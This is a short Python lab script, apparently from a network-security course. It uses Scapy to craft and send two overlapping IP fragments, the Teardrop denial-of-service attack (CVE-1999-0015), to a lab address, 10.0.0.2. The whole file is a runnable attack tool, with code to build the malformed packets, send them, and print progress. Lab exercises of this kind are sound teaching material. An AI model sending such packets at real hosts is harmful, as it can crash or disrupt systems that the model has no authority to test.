#!/usr/bin/env python3
"""
Lab 06: Teardrop Attack Script (Overlapping IP Fragments, CVE-1999-0015)
Crafts two fragmented IP packets with overlapping offsets:
- Fragment 1: offset=0, MF=1, 24 bytes payload (byte 0..23)
- Fragment 2: offset=1 (byte 8..31), MF=0, 24 bytes payload
Resulting in an overlap of 16 bytes (byte 8..23).
"""
import sys
import time
from scapy.all import IP, send

dst = "10.0.0.2"
ipid = 1234

print(f"[*] Crafting Teardrop overlapping IP fragments:")
print(f"    - Target IP : {dst}")
print(f"    - IP ID     : {ipid}")

# Fragment 1: offset = 0 (bytes 0..23), MF = 1 (More Fragments), payload 24 bytes of 'A'
f1 = IP(dst=dst, id=ipid, flags="MF", frag=0, proto=17) / (b"A" * 24)

# Fragment 2: offset = 1 (8 bytes * 1 = bytes 8..31), MF = 0 (Last fragment), payload 24 bytes of 'B'
# Overlap: bytes 8..23 (16 bytes overlap)
f2 = IP(dst=dst, id=ipid, flags=0, frag=1, proto=17) / (b"B" * 24)

print(f"    - Fragment 1: frag=0, flags=MF, payload_len=24 (bytes 0..23)")
print(f"    - Fragment 2: frag=1 (offset 8), flags=0, payload_len=24 (bytes 8..31)")
print(f"    - Overlap Range: bytes 8..23 (16 bytes)")

send([f1, f2], verbose=0)
print(f"[+] Sent 2 overlapping IP fragments (Teardrop ID={ipid}) to {dst}")

